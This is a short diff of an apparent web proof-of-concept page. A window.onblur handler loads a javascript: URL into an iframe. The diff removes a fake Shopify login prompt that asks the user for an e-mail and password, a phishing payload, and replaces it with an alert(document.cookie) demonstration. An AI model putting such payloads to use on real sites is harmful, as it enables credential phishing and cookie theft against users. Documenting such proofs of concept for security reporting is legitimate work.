@@ -12,7 +12,7 @@
    
 	<script>
 		window.onblur = function() {
-			document.getElementById("iframe").src = "javascript:alert('In order to access shopify.com\\nyou must first login on your\\nShopify Account.\\n\\nPlease type your e-mail\\nand your password:\\n', 'E-mail / Password.');";
+			document.getElementById("iframe").src = "javascript:alert(document.cookie);";
 		}
 	</script>
 </head>
